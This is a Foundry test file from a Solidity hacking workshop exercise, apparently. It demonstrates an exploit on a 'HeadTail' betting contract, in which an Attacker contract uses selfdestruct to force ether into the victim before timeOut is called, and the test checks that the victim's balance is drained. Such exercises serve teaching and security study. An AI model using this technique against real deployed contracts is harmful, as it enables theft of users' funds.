// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {HeadTail} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise5_HeadTail is Test {
    HeadTail public headTail;
    address partyA = vm.addr(1);
    Attacker attacker = new Attacker();

    function setUp() public {
        vm.startPrank(partyA);
        vm.deal(partyA, 1 ether);
        headTail = new HeadTail{value: 1 ether}(
            keccak256(abi.encodePacked(false, uint256(123456)))
        );
        vm.stopPrank();
    }

    function test_timeOut() public {
        vm.deal(address(this), 1 ether);
        address(attacker).call{value: 1 ether}("");
        attacker.attack(address(headTail));
        vm.warp(1000000);
        headTail.timeOut();
        assertEq(address(headTail).balance, 0);
    }
}

contract Attacker {
    function attack(address _victim) external {
        selfdestruct(payable(_victim));
    }

    fallback() external payable {}
}
